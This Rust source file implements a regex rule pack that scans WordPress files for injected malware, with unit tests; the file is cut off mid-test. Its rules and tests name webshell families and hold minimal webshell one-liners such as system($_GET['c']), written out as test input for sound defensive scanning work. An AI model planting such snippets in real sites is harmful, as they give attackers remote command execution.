//! Layer C: a small compiled-in rule pack for files nothing else vouches for.
//!
//! Input is attacker-controlled bytes, so everything is `regex::bytes` (linear
//! time, no UTF-8 assumption) with bounded repetitions, and the output is
//! bounded too: at most `MAX_HITS` hits per file, `MAX_DOMAINS` domains and
//! `SNIPPET_CHARS` characters of snippet per hit. Snippets are plain text with
//! control characters removed; HTML escaping stays in the template.
//!
//! Rules are tuned against false positives on plain custom code (a child theme
//! hooking `wp_footer` with a short inline script, `base64_decode` on its own,
//! a minified helper loading a same-origin script), because these files get no
//! other vouching.

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::bytes::{Regex, RegexSet, RegexSetBuilder};

/// Bumped whenever a rule changes; a bump re-inspects the Layer B scope once.
pub const RULE_PACK_VERSION: u32 = 5;

/// Bytes of one file that are inspected. A larger inspected file (PHP,
/// JavaScript, HTML, PHP settings) is reported as `too_large_to_inspect` (never
/// skipped silently); only the first `INSPECT_MAX_BYTES` of it are matched.
pub const INSPECT_MAX_BYTES: usize = 2 * 1024 * 1024;

const MAX_HITS: usize = 20;
const MAX_DOMAINS: usize = 10;
const SNIPPET_CHARS: usize = 120;
/// Domains are read from the matched line, but at most this far either side of
/// the match, so a one-line 2 MiB bundle costs the same as a short file.
const DOMAIN_WINDOW: usize = 4096;

/// Extensions that make a file PHP-like as the final extension.
const PHP_EXTS: [&str; 11] = [
    "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "inc",
];
/// Extensions that also count in the middle of a name (`x.php.jpg`): the
/// handler-mapped ones. `inc` and `pht` are not, so `x.inc.pdf` is a PDF.
const PHP_MID_EXTS: [&str; 9] = [
    "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8",
];
const SCRIPT_EXTS: [&str; 5] = ["js", "mjs", "cjs", "html", "htm"];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleHit {
    pub rule_id: &'static str,
    pub severity: Severity,
    /// 1-based line of the match.
    pub line: u32,
    /// Host names from http(s) URLs on the matched line, deduped, lowercase.
    pub domains: Vec<String>,
    /// At most 120 characters from the match to the end of its line.
    pub snippet: String,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// PHP-like files only.
    Php,
    /// JavaScript, HTML and PHP-like files (injected `<script>` lives in all).
    Script,
    /// `.htaccess` and `.user.ini`: what PHP is told to do, not PHP itself.
    PhpSettings,
}

struct Rule {
    id: &'static str,
    severity: Severity,
    scope: Scope,
    pattern: &'static str,
    guard: Option<Guard>,
}

/// A second look at each match, for what one pattern can't say.
#[derive(Clone, Copy)]
enum Guard {
    /// This must match in the same file: within [`NEAR_BYTES`] the rule's own
    /// severity, further away Medium.
    Near(&'static str),
    /// This must not match inside it.
    Unless(&'static str),
}

/// How far a hook and its payload can be apart to be High. Wordfence has a long
/// literal 177 kB from its `wp_head` hook; that is worth a look, not an alarm.
const NEAR_BYTES: usize = 8 * 1024;

/// The script is added and the removal sits in the body of the cleanup function
/// that comes next: React's `useEffect` idiom, which removes the tag when the
/// component goes away. A removal outside such a body is not exempt.
const CLEANUP_AFTER_APPEND: &str = r"(?-u)appendChild\s*\([^)]{0,64}\)\s*[,;]?\s*(?:return\s*)?(?:\(\s*\)\s*=>|function\s*\(\s*\))\s*\{[^};]{0,200}?(?:removeChild\s*\(|\.remove\s*\(\s*\))";

/// An encoded string literal over about 3 kB. A `data:` URI never matches: the
/// run of base64 starts after a comma, not after the opening quote.
const BIG_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{3000,}['"]"#;
/// Base64 that decodes to an image or font header (SVG, `<?xml`, PNG, GIF,
/// JPEG, RIFF/WebP, WOFF, WOFF2): plugins inline their admin menu icon so.
const ENCODED_MEDIA: &str =
    r#"(?-u)^['"](?:PHN2Zy|PD94bWw|iVBORw0KGgo|R0lGOD|/9j/|UklGR|d09GRg|d09GMg)"#;
const PAYLOAD_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{256,}['"]"#;

/// High rules first: when a file hits the cap, the worst findings survive.
const RULES: &[Rule] = &[
    Rule {
        id: "eval_decoder",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:eval|assert)\s*\(\s*@?\s*(?:base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|convert_uudecode|hex2bin|strrev|rawurldecode)\s*\(",
        guard: None,
    },
    Rule {
        id: "request_to_exec",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:eval|assert|system|passthru|shell_exec|exec|popen|proc_open|pcntl_exec)\s*\(\s*@?\s*(?:(?:stripslashes|base64_decode|trim)\s*\(\s*)?@?\$_(?:GET|POST|REQUEST|COOKIE)\b",
        guard: None,
    },
    Rule {
        id: "request_callable",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?-u)\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]\n]{1,64}\]\s*\(",
        guard: None,
    },
    Rule {
        id: "webshell_marker",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:b374k|c99\s*shell|c99\s*madshell|r57\s*shell|filesman|wso\s*shell|wso_version|wsosetcookie|indoxploit|p0wny\s*shell|alfa_data|weevely|china\s*chopper)\b",
        guard: None,
    },
    Rule {
        id: "footer_hook_payload",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r#"(?i-u)\badd_action\s*\(\s*['"](?:wp_footer|wp_head)['"]"#,
        guard: Some(Guard::Near(PAYLOAD_LITERAL)),
    },
    Rule {
        id: "js_self_removing_loader",
        severity: Severity::High,
        scope: Scope::Script,
        // The incident's behaviour: a script element with a remote src that
        // removes its own tag afterwards. Plain widget loaders (chat, analytics)
        // leave their tag in place and stay at js_remote_script.
        pattern: r#"(?i-u)createElement\s*\(\s*['"]script['"]\s*\)(?s:.){0,300}?(?:\.src\s*=|setAttribute\s*\(\s*['"]src['"]\s*,)\s*['"]?(?:https?:)?//[a-z0-9](?s:.){0,300}?(?:removeChild\s*\(|\.remove\s*\(\s*\))"#,
        guard: Some(Guard::Unless(CLEANUP_AFTER_APPEND)),
    },
    Rule {
        id: "encoded_literal_large",
        severity: Severity::Medium,
        scope: Scope::Php,
        pattern: BIG_LITERAL,
        guard: Some(Guard::Unless(ENCODED_MEDIA)),
    },
    Rule {
        id: "js_remote_script",
        severity: Severity::Medium,
        scope: Scope::Script,
        // A script element given a remote src, or document.write of a remote
        // <script>. A relative or same-origin path has no `//` after the quote.
        pattern: r#"(?i-u)(?:createElement\s*\(\s*['"]script['"]\s*\)(?s:.){0,300}?(?:\.src\s*=|setAttribute\s*\(\s*['"]src['"]\s*,)\s*['"]?(?:https?:)?//[a-z0-9]|document\.write\s*\(\s*['"]<script[^>]{0,160}?\ssrc\s*=\s*\\?['"]?(?:https?:)?//[a-z0-9])"#,
        guard: None,
    },
    Rule {
        id: "js_atob_eval",
        severity: Severity::Medium,
        scope: Scope::Script,
        pattern: r"(?-u)\b(?:eval|Function)\s*\([^;{}]{0,80}?\batob\s*\(",
        guard: None,
    },
    Rule {
        id: "php_prepend_setting",
        // Runs a file before every request. Also how Wordfence sets up its
        // firewall, so it's worth a look and not an alarm.
        severity: Severity::Medium,
        scope: Scope::PhpSettings,
        // `R`: PHP's ini parser takes a bare CR as a line end too.
        pattern: r"(?imR-u)^[ \t]*(?:php_value[ \t]+)?auto_(?:prepend|append)_file\b",
        guard: None,
    },
];

struct Compiled {
    rule: &'static Rule,
    re: Regex,
    guard: Option<(Guard, Regex)>,
}

struct Pack {
    set: RegexSet,
    rules: Vec<Compiled>,
    url: Regex,
}

fn build_pack() -> Result<Pack, regex::Error> {
    let set = RegexSetBuilder::new(RULES.iter().map(|r| r.pattern)).build()?;
    let mut rules = Vec::with_capacity(RULES.len());
    for rule in RULES {
        rules.push(Compiled {
            rule,
            re: Regex::new(rule.pattern)?,
            guard: rule
                .guard
                .map(|g| {
                    let (Guard::Near(p) | Guard::Unless(p)) = g;
                    Regex::new(p).map(|re| (g, re))
                })
                .transpose()?,
        });
    }
    // Scheme (or a quote for a protocol-relative URL), optional userinfo, then
    // a dotted host. Dotless hosts (`localhost`) are not worth reporting.
    let url = Regex::new(
        r#"(?i-u)(?:https?:|['"])//(?:[^/\s'"@<>]{1,100}@)?([a-z0-9][a-z0-9.-]{0,251}\.[a-z0-9-]{1,63})"#,
    )?;
    Ok(Pack { set, rules, url })
}

// The patterns are compile-time constants and `rule_pack_compiles` builds the
// pack, so a failure here is caught by the test suite, never in production.
#[allow(clippy::expect_used)]
static PACK: LazyLock<Pack> = LazyLock::new(|| build_pack().expect("rule pack patterns compile"));

/// PHP can run under this name: a PHP extension as the final extension, or a
/// handler-mapped one followed by more (`x.php.jpg`, which older Apache setups
/// execute). `inc` and `pht` count only as the final extension.
pub fn is_php_like(rel_path: &str) -> bool {
    let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
    let mut exts = name.split('.').skip(1).peekable();
    while let Some(ext) = exts.next() {
        let set: &[&str] = if exts.peek().is_none() {
            &PHP_EXTS
        } else {
            &PHP_MID_EXTS
        };
        if set.iter().any(|e| ext.eq_ignore_ascii_case(e)) {
            return true;
        }
    }
    false
}

/// A directory named exactly `uploads` anywhere in the path: nested installs
/// (`blog/wp-content/uploads/`) and non-WordPress layouts count.
fn under_uploads(rel_path: &str) -> bool {
    let mut parts = rel_path.split('/');
    parts.next_back();
    parts.any(|c| c == "uploads")
}

/// Bytes an `index.php` stub may have; plugins' are a line or two.
const STUB_MAX_BYTES: usize = 512;

/// Bytes a guard `.htaccess` may have; All-in-One WP Migration's is about 600.
const GUARD_HTACCESS_MAX_BYTES: usize = 2048;

/// A small file a plugin writes to keep people out of a folder, which neither
/// runs code nor changes what runs: an `index.php` stub (see
/// [`is_silence_stub`]) or an `.htaccess` that only denies access (see
/// [`is_deny_htaccess`]). All-in-One WP Migration writes both into its own
/// `storage/` at runtime, so they are never in the wordpress.org manifest.
pub fn is_access_guard(rel_path: &str, bytes: &[u8]) -> bool {
    match rel_path.rsplit('/').next() {
        Some("index.php") => is_silence_stub(rel_path, bytes),
        Some(".htaccess") => is_deny_htaccess(bytes),
        _ => false,
    }
}

/// An `.htaccess` whose every line is access control, a listing switch-off,
/// or a harmless type: `Require all …`, `Order`/`Deny`/`Allow`/`Satisfy`,
/// `Options` that only remove, `DirectoryIndex`, `AddType text/plain` or
/// `application/octet-stream`, and `<IfModule>`/`<Files>`/`<FilesMatch>`
/// sections. A handler, a rewrite, a PHP setting, an error document, or a
/// continued line is not.
fn is_deny_htaccess(bytes: &[u8]) -> bool {
    if bytes.len() > GUARD_HTACCESS_MAX_BYTES {
        return false;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    // A bare CR: where one line ends is then a matter of who reads it.
    if text.replace("\r\n", "\n").contains('\r') {
        return false;
    }
    text.trim_start_matches('\u{feff}')
        .lines()
        .all(|raw| {
            let line = raw.trim();
            if line.ends_with('\\') {
                return false;
            }
            if line.is_empty() || line.starts_with('#') {
                return true;
            }
            let mut words = line.split_ascii_whitespace();
            let Some(first) = words.next() else {
                return true;
            };
            let args: Vec<String> = words.map(str::to_ascii_lowercase).collect();
            match first.to_ascii_lowercase().as_str() {
                "</ifmodule>" | "</files>" | "</filesmatch>" => args.is_empty(),
                "<ifmodule" | "<files" | "<filesmatch" => line.ends_with('>'),
                "require" => {
                    matches!(args.as_slice(), [all, v] if all == "all" && (v == "denied" || v == "granted"))
                }
                "order" | "satisfy" => true,
                "deny" | "allow" => args.first().is_some_and(|a| a == "from"),
                "options" => !args.is_empty() && args.iter().all(|a| a.starts_with('-')),
                "directoryindex" => !args.is_empty(),
                "addtype" => matches!(
                    args.first().map(String::as_str),
                    Some("text/plain" | "application/octet-stream")
                ),
                _ => false,
            }
        })
}

/// An `index.php` that only stops directory listing. Plugins drop one into
/// every folder they make: empty (WP All Import `touch()`es it), plain text
/// with no markup (All-in-One WP Migration), or `<?php`, comments, and
/// optionally `?>` with nothing after it. Text with no `<` in it can't open PHP
/// mode and isn't markup when served. A `?>` inside a line comment ends PHP
/// mode there, so such a file is not a stub; nor is a `#[` attribute, an
/// unclosed block comment, or any output.
fn is_silence_stub(rel_path: &str, bytes: &[u8]) -> bool {
    if rel_path.rsplit('/').next() != Some("index.php") || bytes.len() > STUB_MAX_BYTES {
        return false;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    if !text.contains('<') {
        return true;
    }
    let Some(mut rest) = text
        .trim_start_matches('\u{feff}')
        .trim_start()
        .strip_prefix("<?php")
    else {
        return false;
    };
    // `<?php` must be followed by whitespace or end the file to be an open tag.
    if !rest.is_empty() && !rest.starts_with(char::is_whitespace) {
        return false;
    }
    loop {
        rest = rest.trim_start();
        if rest.is_empty() {
            return true;
        }
        if let Some(after) = rest.strip_prefix("?>") {
            return after.trim().is_empty();
        }
        if let Some(body) = rest.strip_prefix("/*") {
            let Some(end) = body.find("*/") else {
                return false;
            };
            rest = &body[end + 2..];
        } else if rest.starts_with("//") || (rest.starts_with('#') && !rest.starts_with("#[")) {
            let line = &rest[..rest.find('\n').unwrap_or(rest.len())];
            if line.contains("?>") {
                return false;
            }
            rest = &rest[line.len()..];
        } else {
            return false;
        }
    }
}

/// Bytes of a Twig cache file searched for its class line; Twig writes it after
/// a dozen `use` lines.
const TWIG_HEAD_BYTES: usize = 4096;

/// Twig's class line: `__TwigTemplate_` and a sha256 (Twig 1 and 2, and 3 on
/// PHP before 8.1) or xxh128 (Twig 3 on 8.1+) of the cache key, `___<n>` for an
/// embedded template. WPML's prefixed copy writes the same line after
/// `namespace WPML\Core;`.
#[allow(clippy::expect_used)]
static TWIG_CLASS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\nclass __TwigTemplate_[0-9a-f]{32}(?:[0-9a-f]{32})?(?:___[0-9]{1,6})? extends ")
        .expect("twig class regex")
});

/// A template Twig compiled into its file cache. WPML keeps one in
/// `uploads/cache/wpml/twig/`, so every screen it renders leaves a PHP file
/// under uploads, and recompiles it in place (`auto_reload`) when the template
/// changes. Twig names it `<h0h1>/<hash>.php`, the hash of the class name, and
/// opens it with `<?php` and a class line (see [`TWIG_CLASS`]).
///
/// The shape says who wrote it, not that it is harmless: the content rules still
/// read it like any other PHP file.
pub fn is_twig_cache(rel_path: &str, bytes: &[u8]) -> bool {
    let mut parts = rel_path.rsplit('/');
    let (Some(name), Some(dir)) = (parts.next(), parts.next()) else {
        return false;
    };
    let Some(hash) = name.strip_suffix(".php") else {
        return false;
    };
    let lower_hex = |s: &str| s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'));
    if !matches!(hash.len(), 32 | 64)
        || !lower_hex(hash)
        || dir.len() != 2
        || !hash.starts_with(dir)
    {
        return false;
    }
    let head = &bytes[..bytes.len().min(TWIG_HEAD_BYTES)];
    head.starts_with(b"<?php") && TWIG_CLASS.is_match(head)
}

/// WP All Import's Function Editor: PHP the site's admin writes, which the
/// plugin `require_once`s on every import from `<uploads>/wpallimport/` (a
/// multisite's `uploads/sites/<n>/` too). Its own code, not a drop.
pub fn is_wp_all_import_functions(rel_path: &str) -> bool {
    let mut parts = rel_path.rsplit('/');
    if parts.next() != Some("functions.php") || parts.next() != Some("wpallimport") {
        return false;
    }
    match parts.next() {
        Some("uploads") => true,
        Some(n) if !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()) => {
            parts.next() == Some("sites") && parts.next() == Some("uploads")
        }
        _ => false,
    }
}

/// PHP a known plugin keeps under uploads by design. Not a `php_in_uploads`
/// finding; the content rules still apply.
fn is_plugin_php_in_uploads(rel_path: &str, bytes: &[u8]) -> bool {
    is_silence_stub(rel_path, bytes)
        || is_twig_cache(rel_path, bytes)
        || is_wp_all_import_functions(rel_path)
}

fn is_script_like(rel_path: &str) -> bool {
    rel_path
        .rsplit_once('.')
        .is_some_and(|(_, ext)| SCRIPT_EXTS.iter().any(|e| ext.eq_ignore_ascii_case(e)))
}

fn is_php_settings(rel_path: &str) -> bool {
    matches!(
        rel_path.rsplit('/').next().unwrap_or(rel_path),
        ".htaccess" | ".user.ini"
    )
}

fn is_core_lookalike(rel_path: &str) -> bool {
    if rel_path.starts_with("wp-includes/") || rel_path.starts_with("wp-admin/") {
        return false;
    }
    let name = rel_path
        .rsplit('/')
        .next()
        .unwrap_or(rel_path)
        .to_ascii_lowercase();
    name.starts_with("class-wp-") && name.ends_with(".php")
}

/// Inspect one file. `rel_path` is relative to the document root. Only PHP-like,
/// JavaScript, HTML and PHP settings files get content rules; any PHP-like file
/// under a directory named `uploads` is a finding by its path alone, unless a
/// known plugin keeps it there (an `index.php` stub, a Twig cache file, WP All
/// Import's functions.php). Never panics and
/// never returns more than 20 hits, sorted by line.
///
/// Only the first `INSPECT_MAX_BYTES` are matched. The caller must pass up to
/// `INSPECT_MAX_BYTES + 1` bytes of the file: the extra byte is what raises
/// `too_large_to_inspect`, so a caller that truncates at the cap exactly never
/// sees the signal.
pub fn inspect(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
    inspect_with(rel_path, bytes, is_php_like(rel_path))
}

/// `inspect` for a file PHP runs whatever it is called: WordPress requires
/// `.maintenance` on every load.
pub fn inspect_as_php(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
    inspect_with(rel_path, bytes, true)
}

fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
    let script = php || is_script_like(rel_path);
    let settings = is_php_settings(rel_path);
    let body = &bytes[..bytes.len().min(INSPECT_MAX_BYTES)];

    let mut hits: Vec<RuleHit> = Vec::new();
    if php && under_uploads(rel_path) && !is_plugin_php_in_uploads(rel_path, bytes) {
        hits.push(path_hit("php_in_uploads", Severity::High, rel_path));
    }
    if (script || settings) && bytes.len() > INSPECT_MAX_BYTES {
        hits.push(path_hit(
            "too_large_to_inspect",
            Severity::Medium,
            "larger than the 2 MiB inspect limit, only the start was checked",
        ));
    }
    if !script && !settings {
        return hits;
    }

    // Match positions per rule, High rules first, bounded by MAX_HITS each.
    let pack = &*PACK;
    let mut found: Vec<(&Compiled, Vec<(usize, usize, Severity)>)> = Vec::new();
    let mut first_start: Option<usize> = None;
    for idx in pack.set.matches(body).iter() {
        let c = &pack.rules[idx];
        let applies = match c.rule.scope {
            Scope::Php => php,
            Scope::Script => script,
            Scope::PhpSettings => settings,
        };
        if !applies {
            continue;
        }
        // A whole-file search, so a literal longer than the window still counts.
        let near: Vec<(usize, usize)> = match &c.guard {
            Some((Guard::Near(_), re)) => {
                re.find_iter(body).map(|m| (m.start(), m.end())).collect()
            }
            _ => Vec::new(),
        };
        let spans: Vec<(usize, usize, Severity)> =
            c.re.find_iter(body)
                .filter_map(|m| {
                    let severity = match &c.guard {
                        None => c.rule.severity,
                        Some((Guard::Near(_), _)) if near.is_empty() => return None,
                        Some((Guard::Near(_), _)) => {
                            let close = near.iter().any(|(s, e)| {
                                *s <= m.end().saturating_add(NEAR_BYTES)
                                    && *e >= m.start().saturating_sub(NEAR_BYTES)
                            });
                            if close {
                                c.rule.severity
                            } else {
                                Severity::Medium
                            }
                        }
                        Some((Guard::Unless(_), re)) if re.is_match(m.as_bytes()) => return None,
                        Some((Guard::Unless(_), _)) => c.rule.severity,
                    };
                    Some((m.start(), m.end(), severity))
                })
                .take(MAX_HITS)
                .collect();
        if spans.is_empty() {
            continue;
        }
        first_start = Some(first_start.map_or(spans[0].0, |m| m.min(spans[0].0)));
        found.push((c, spans));
    }

    // A core-looking name outside core plus any content rule: the name is the disguise.
    if let (Some(start), true) = (first_start, is_core_lookalike(rel_path)) {
        let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
        let mut h = path_hit("core_name_decoy", Severity::Medium, name);
        h.line = line_of(body, start);
        hits.push(h);
    }

    // One hit per rule first, then more of each in turn, so a noisy rule
    // cannot hide the others.
    let mut round = 0;
    'fill: while hits.len() < MAX_HITS {
        let mut any = false;
        for (c, spans) in &found {
            if let Some(&(start, end, severity)) = spans.get(round) {
                any = true;
                hits.push(make_hit(pack, c.rule, severity, body, start, end));
                if hits.len() >= MAX_HITS {
                    break 'fill;
                }
            }
        }
        if !any {
            break;
        }
        round += 1;
    }
    hits.sort_by(|a, b| a.line.cmp(&b.line).then(b.severity.cmp(&a.severity)));
    hits.truncate(MAX_HITS);
    hits
}

fn path_hit(rule_id: &'static str, severity: Severity, text: &str) -> RuleHit {
    RuleHit {
        rule_id,
        severity,
        line: 1,
        domains: Vec::new(),
        snippet: clean(text.as_bytes()),
    }
}

fn make_hit(
    pack: &Pack,
    rule: &Rule,
    severity: Severity,
    body: &[u8],
    start: usize,
    end: usize,
) -> RuleHit {
    let line_start = body[..start]
        .iter()
        .rposition(|&b| b == b'\n')
        .map_or(0, |p| p + 1);
    let line_end = body[end..]
        .iter()
        .position(|&b| b == b'\n')
        .map_or(body.len(), |p| end + p);
    let lo = line_start.max(start.saturating_sub(DOMAIN_WINDOW));
    let hi = line_end.min(end.saturating_add(DOMAIN_WINDOW));
    // The snippet runs to the end of the line; four bytes per character is the
    // most `clean` can use.
    let snip_end = line_end.min(start + SNIPPET_CHARS * 4);
    RuleHit {
        rule_id: rule.id,
        severity,
        line: line_of(body, start),
        domains: domains(&pack.url, &body[lo..hi]),
        snippet: clean(&body[start..snip_end]),
    }
}

fn line_of(body: &[u8], offset: usize) -> u32 {
    let n = body[..offset].iter().filter(|&&b| b == b'\n').count() + 1;
    u32::try_from(n).unwrap_or(u32::MAX)
}

fn domains(url: &Regex, region: &[u8]) -> Vec<String> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for caps in url.captures_iter(region) {
        let Some(m) = caps.get(1) else { continue };
        let host = String::from_utf8_lossy(m.as_bytes())
            .trim_end_matches(['-', '.'])
            .to_ascii_lowercase();
        if seen.insert(host.clone()) {
            out.push(host);
            if out.len() >= MAX_DOMAINS {
                break;
            }
        }
    }
    out
}

/// Lossy UTF-8, first line only, at most `SNIPPET_CHARS` characters, with
/// control and text-direction characters replaced by a space.
fn clean(raw: &[u8]) -> String {
    let line = raw
        .split(|&b| b == b'\n' || b == b'\r')
        .next()
        .unwrap_or(raw);
    let s: String = String::from_utf8_lossy(line)
        .chars()
        .take(SNIPPET_CHARS)
        .map(|c| if is_unsafe_char(c) { ' ' } else { c })
        .collect();
    s.trim_end().to_string()
}

fn is_unsafe_char(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{2069}' | '\u{feff}'
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    macro_rules! fx {
        ($name:literal) => {
            include_bytes!(concat!("../../tests/fixtures/sitescan/", $name)) as &[u8]
        };
    }

    const HOST: &str = "malicious-loader.example";

    fn ids(hits: &[RuleHit]) -> Vec<&'static str> {
        hits.iter().map(|h| h.rule_id).collect()
    }

    fn worst(hits: &[RuleHit]) -> Option<Severity> {
        hits.iter().map(|h| h.severity).max()
    }

    #[test]
    fn rule_pack_compiles() {
        const { assert!(RULE_PACK_VERSION >= 1) };
        // Forces the one-time compile: a broken pattern fails here, not in production.
        LazyLock::force(&PACK);
    }

    #[test]
    fn fake_403_shell_is_high() {
        let h = inspect("wp-content/themes/x/403.php", fx!("fake403_shell.php"));
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"webshell_marker"));
        assert!(h.iter().any(|h| h.domains.iter().any(|d| d == HOST)));
    }

    #[test]
    fn fake_doctrine_eval_is_high() {
        let h = inspect(
            "wp-content/plugins/p/src/Http.php",
            fx!("fake_doctrine.php"),
        );
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"eval_decoder"));
        assert_eq!(h[0].line, 2);
    }

    #[test]
    fn appended_js_loader_is_high() {
        let h = inspect("wp-content/themes/x/app.js", fx!("appended_js_loader.js"));
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"js_remote_script"));
        let hit = h
            .iter()
            .find(|h| h.rule_id == "js_self_removing_loader")
            .unwrap();
        assert!(hit.domains.iter().any(|d| d == HOST), "{:?}", hit.domains);
        assert_eq!(hit.line, 3);
    }

    #[test]
    fn footer_hook_with_encoded_literal_is_high() {
        let h = inspect(
            "wp-content/themes/x/functions.php",
            fx!("functions_footer.php"),
        );
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"footer_hook_payload"));
        assert!(ids(&h).contains(&"encoded_literal_large"));
        let hit = h
            .iter()
            .find(|h| h.rule_id == "footer_hook_payload")
            .unwrap();
        assert!(hit.domains.iter().any(|d| d == HOST), "{:?}", hit.domains);
    }

    #[test]
    fn clean_child_theme_functions_stays_clean() {
        let h = inspect(
            "wp-content/themes/child/functions.php",
            fx!("clean_functions.php"),
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn clean_minified_js_stays_clean() {
        let h = inspect(
            "wp-content/themes/child/js/helper.min.js",
            fx!("clean_minified.js"),
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn inspect_as_php_runs_php_rules_on_any_name() {
        let shell = fx!("fake403_shell.php");
        assert!(inspect(".maintenance", shell).is_empty());
        let h = inspect_as_php(".maintenance", shell);
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"webshell_marker"));
    }

    #[test]
    fn prepend_settings_are_medium_where_php_reads_them() {
        for (rel, src) in [
            (
                ".user.ini",
                &b"; Wordfence WAF\nauto_prepend_file = '/home/u/wordfence-waf.php'\n; END\n"[..],
            ),
            (
                "wp-content/uploads/.htaccess",
                b"<IfModule mod_php7.c>\n\tphp_value auto_prepend_file '/tmp/x'\n</IfModule>\n",
            ),
            (".user.ini", b"AUTO_APPEND_FILE=/tmp/x\n"),
        ] {
            let h = inspect(rel, src);
            assert_eq!(ids(&h), ["php_prepend_setting"], "{rel}");
            assert_eq!(worst(&h), Some(Severity::Medium));
        }
        // Commented out, or in another file type, is nothing.
        assert!(inspect(".user.ini", b"; auto_prepend_file = x\n").is_empty());
        assert!(inspect("a.php", b"<?php\nauto_prepend_file\n").is_empty());
        assert!(inspect("a.txt", b"auto_prepend_file = x\n").is_empty());
        // PHP's ini parser takes a bare CR as a line end, so a match starts there.
        let h = inspect(".user.ini", b"; x\rauto_prepend_file=/tmp/x\r");
        assert_eq!(ids(&h), ["php_prepend_setting"]);
        assert!(h[0].snippet.starts_with("auto_prepend_file"), "{h:?}");
        // Too big to read to the end is reported, like PHP.
        let mut big = vec![b';'; INSPECT_MAX_BYTES + 1];
        big.push(b'\n');
        assert_eq!(ids(&inspect(".htaccess", &big)), ["too_large_to_inspect"]);
        // And PHP's own rules don't run on a settings file.
        assert!(inspect(".htaccess", b"# eval(base64_decode('x'))\n").is_empty());
    }

    #[test]
    fn base64_decode_alone_is_clean() {
        let src = b"<?php $x = base64_decode($_COOKIE['t'] ?? '', true); echo strlen((string)$x);";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn footer_hook_without_payload_is_clean() {
        let src = b"<?php add_action( 'wp_head', 'my_head' ); function my_head() { echo '<meta name=\"x\" content=\"y\">'; }";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn eval_over_decoder_variants_are_high() {
        for src in [
            &b"<?php eval(gzinflate(base64_decode('AAAA')));"[..],
            b"<?php @eval ( str_rot13('abc') );",
            b"<?php assert(base64_decode($x));",
            b"<?php EVAL(\n\tgzuncompress(\n$x));",
        ] {
            let h = inspect("a.php", src);
            assert_eq!(
                worst(&h),
                Some(Severity::High),
                "{}",
                String::from_utf8_lossy(src)
            );
        }
    }

    #[test]
    fn request_data_reaching_exec_is_high() {
        for src in [
            &b"<?php system($_GET['c']);"[..],
            b"<?php eval(stripslashes($_POST['c']));",
            b"<?php passthru( $_REQUEST['c'] );",
            b"<?php shell_exec(@$_COOKIE['c']);",
            b"<?php $_POST['f']($_POST['a']);",
        ] {
            let h = inspect("a.php", src);
            assert_eq!(
                worst(&h),
                Some(Severity::High),
                "{}",
                String::from_utf8_lossy(src)
            );
        }
    }

    #[test]
    fn plain_exec_of_literal_is_clean() {
        let src = b"<?php $o = shell_exec('uptime'); echo eval_count($o); $a = $_GET['id'] ?? 0;";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn atob_into_eval_is_medium() {
        let h = inspect("a.js", b"var p=\"ZWNobw==\";eval(atob(p));");
        assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
        assert_eq!(ids(&h), ["js_atob_eval"]);
        let h = inspect("a.js", b"new Function(window.atob(x))();");
        assert_eq!(ids(&h), ["js_atob_eval"]);
    }

    #[test]
    fn atob_alone_is_clean() {
        assert!(inspect(
            "a.js",
            b"var s=atob(document.body.dataset.s);console.log(s);"
        )
        .is_empty());
    }

    #[test]
    fn php_under_uploads_is_high() {
        let h = inspect(
            "wp-content/uploads/2024/05/image.php",
            b"<?php // nothing\n",
        );
        assert_eq!(ids(&h), ["php_in_uploads"]);
        assert_eq!(h[0].severity, Severity::High);
        assert_eq!(h[0].line, 1);
        assert_eq!(h[0].snippet, "wp-content/uploads/2024/05/image.php");
    }

    #[test]
    fn php_under_nested_or_non_wp_uploads_is_high() {
        for p in [
            "blog/wp-content/uploads/2024/x.php",
            "sub/site/wp-content/uploads/x.phtml",
            "uploads/x.php",
            "app/uploads/deep/er/x.php.jpg",
            "wp-content/uploads/sites/2/x.PHP",
        ] {
            let h = inspect(p, b"<?php // nothing\n");
